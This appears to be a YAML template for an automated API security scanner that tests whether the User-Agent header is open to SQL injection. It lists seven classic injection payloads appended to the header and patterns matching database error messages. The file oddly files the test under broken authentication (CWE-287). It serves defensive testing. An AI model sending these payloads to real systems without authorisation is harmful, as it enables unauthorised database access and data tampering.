id: SQL_INJECTION_USER_AGENT_HEADER
info:
  name: "SQL Injection test on User Agent Header"
  description: >
    "SQL Injection testing on the User Agent Header involves probing for vulnerabilities in web applications where the User-Agent HTTP header is improperly sanitized or directly used in SQL queries. Attackers manipulate the User-Agent header to inject malicious SQL commands, aiming to exploit backend databases such as MySQL. This test helps uncover and mitigate security weaknesses to prevent unauthorized database access and data breaches through user input manipulation."
  details: >
    "SQL Injection testing on the User Agent Header targets vulnerabilities in web applications where the User-Agent HTTP header, containing client information, is mishandled. Attackers exploit this by injecting SQL queries into the header's input, potentially compromising the MySQL database. This technique aims to identify and rectify vulnerabilities in how user input from headers is processed to prevent unauthorized database access and data manipulation."
  impact: >
    "The impact of SQL Injection through the User-Agent Header can be significant, compromising the security and integrity of web applications and their associated databases. Successful exploitation allows attackers to execute unauthorized SQL commands, potentially leading to data theft, modification, or deletion within the MySQL database. Additionally, it may result in service disruptions, user privacy breaches, and regulatory non-compliance, highlighting the critical need for stringent input validation and security measures in web application development."

  category:
    name: NO_AUTH
    shortName: Broken Authentication
    displayName: Broken User Authentication (BUA)
  subCategory: SQL_INJECTION_USER_AGENT_HEADER
  severity: MEDIUM
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
  cwe:
    - CWE-287
  cve:
    - CVE-2020-24008
    - CVE-2021-45901
attributes:
  nature: INTRUSIVE
  plan: FREE
  duration: FAST
compliance_standards: compliance/bua.conf
remediation: remediation/SQL_INJECTION_USER_AGENT_HEADER.md
inactive: true
api_selection_filters:
  method:
    neq: "OPTIONS"
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
  request_headers:
    for_one:
      key:
        regex: "^User-Agent$|^user-agent$"
        extract: userKey
      value:
        extract: userVal
wordLists:
  userAgentPayloads:
    - "' OR '1'='1"
    - "' OR 1=1 --"
    - "' OR 'x'='x"
    - "' OR 1=1 LIMIT 1 --"
    - "' UNION SELECT null,null,null --"
    - "' AND 1=0 --"
    - "'; SELECT 1; --"

execute:
  type: single
  requests:
    - req:
        - modify_header:
            userKey: ${userVal}${userAgentPayloads}

validate:
  or:
    - response_payload:
        length:
          gt: 0
        contains_either:
          - SQL syntax
          - MySQL
          - mysqli
          - MySQLSyntaxErrorException
          - Mysqli_Exception
          - MySqlException
          - SQLSTATE
          - PostgreSQL
          - valid PostgreSQL result
          - Npgsql
          - PSQLException
          - SQL Server
          - SQLServer JDBC Driver
          - SqlConnection
          - SqlException
          - Oracle error
          - quoted string not properly terminated
          - OracleException
          - SQLite
          - SQLITE_ERROR
          - "sqlite3.OperationalError:"
          - "SQLite3::SQLException"
          - "SQLiteException"
          - "SQLITE_CONSTRAINT"
    - response_headers:
        for_one:
          key:
            regex: .*
          value:
            contains_either:
              - "' OR '1'='1"
              - "' OR 1=1 --"
              - "' OR 'x'='x"
              - "' OR 1=1 LIMIT 1 --"
              - "' UNION SELECT null,null,null --"
              - "' AND 1=0 --"
              - "'; SELECT 1; --"
